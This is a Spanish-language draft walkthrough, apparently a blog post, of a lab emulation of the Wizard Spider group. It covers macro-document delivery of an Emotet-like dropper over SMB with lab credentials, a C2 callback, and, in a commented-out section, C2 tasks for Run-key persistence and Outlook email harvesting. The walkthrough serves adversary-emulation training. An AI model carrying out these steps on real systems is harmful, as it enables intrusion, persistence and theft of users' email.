---
title: Plan de Emulación - Escenario 1 de Wizard Spider
---

# Preparación del entorno:
- Verificar conectividad a red
- En la maquina atante:
    - Instalar smbclient y verificar 
    
```bash
    sudo apt install smbclient  
    smbclient --version
```

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 18-57-54.png)  
    
# FASE 1: COMPROMISO INICIAL – Emotet Dropper

Objetivo: Infectar a Dorothy con un documento Word malicioso que descarga y ejecuta una DLL simulando Emotet.

Procedimiento:


## 1. Subir el documento malicionso a Dorothy, colocarlo en el escritorio.

```bash
    smbclient -U 'oz\judy' //10.0.0.7/C$ -c "put wizard_spider/Resources/Emotet_Dropper/ChristmasCard.docm Users/judy/Desktop/ChristmasCard.docm;" "Passw0rd!"
```

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 19-45-48.png) 

## 2. Iniciar servidor:

```bash
    cd ~/wizard_spider/Resources/control_server
    sudo ./controlServer
```

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 19-51-11.png)  

## 3. Conectarte por RDP a Dorothy:

```bash
    xfreerdp +clipboard /u:oz\\judy /p:"Passw0rd!" /v:10.0.0.7
```

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 19-23-27.png)  

## 4. Ejecutar ataque:

### 1. Ejecutar el dropper de Emotet 

Simular la acción del usuario al abrir el documento malicioso, lo que desencadenará la ejecución de Emotet.

- Dentro de la ventana de la sesión RDP de Dorothy, ve al escritorio del usuario Judy.
- Buscar el documento llamado ChristmasCard.docm.
- Hacer doble clic en el documento para abrirlo con Microsoft Word.
- Word mostrará una advertencia de seguridad sobre las macros. Habilita las macros cuando se te solicite. Esto es crítico para que el malware se ejecute.
- Después de habilitar las macros, deberías ver una ventana de terminal parpadeando brevemente (puede que apenas la notes) mientras se ejecuta la DLL de Emotet. - Espera unos segundos para que se complete la ejecución.

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 20-14-11.png)  
![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 20-14-47.png)  


### 2. Confirmar la sesión C2 (20 minutos)

Verificar que Emotet se ha ejecutado correctamente en Dorothy y ha establecido una conexión con tu servidor de control en Kali.

- Volver a la terminal en tu máquina atacante (Kali Linux) que renombraste como "Control Server" (donde ejecutaste sudo ./controlServer).
- Se debe visualizar un nuevo "callback" o sesión entrante en la salida del servidor. Esto indica que Emotet en Dorothy se ha conectado exitosamente. Busca mensajes que confirmen una nueva conexión o sesión.





---


# posibles titulos:

    “Emulación Controlada de Wizard Spider, APT en un Entorno Simulado”

    “Aplicación de Técnicas de Adversary Emulation para la Comprensión de Wizard Spider en un Laboratorio Virtual”

    “Simulación de un Ataque de Wizard Spider: Un Enfoque Basado en Escenarios Reales”

    “Plan de Emulación de Wizard Spider en un Entorno Controlado#

    “Emulación Táctica de Wizard Spider: De Emotet a Ryuk”

    “Emulación Práctica de APTs: Wizard Spider en un Laboratorio Virtualizado”

    “Diseño y Ejecución de un Escenario de Emulación Basado en Wizard Spider”

    “Estudio Práctico del Comportamiento de Wizard Spider mediante Adversary Emulation con CALDERA y Técnicas MITRE ATT&CK”

--- 
<!-- 
# FASE 2: PERSISTENCIA de Emotet Registry Key

Objetivo: Simular persistencia modificando el registro.
Procedimiento:

## 1. Establecer persistencia:

En la terminal de la máquina atacante, ejecutar el siguiente comando:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 1
```

## 2. Confirmar en Dorothy que se creó la clave:
- Ruta: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- Clave: blbdigital, Valor: rundll32.exe %userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL


--- 

# Fase 3: Descubrimiento de Host de Emotet y Recolección de Credenciales

## 1. Enumerar procesos:

Ejecuta en la terminal del cliente:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 2
```
Esto hará que Emotet enumere los procesos en Dorothy.

## 2. Descargar Outlook Scraper DLL:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 3
```
Emotet descargará la DLL del scraper de Outlook. 

## 3.  Cargar Outlook Scraper DLL:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 4
```
Emotet cargará la DLL en su espacio de memoria

## 4.  Extraer contenido de correo electrónico de Outlook:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 5
```
Emotet utilizará PowerShell para extraer información de correo electrónico.

## 5.  Extraer direcciones de correo electrónico:
```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 8
```
Emotet recolectará direcciones de correo electrónico. 


Se obtendra el acceso al usuario bill@oz.local para la siguiente fase.

```bash

```


```bash

``` -->
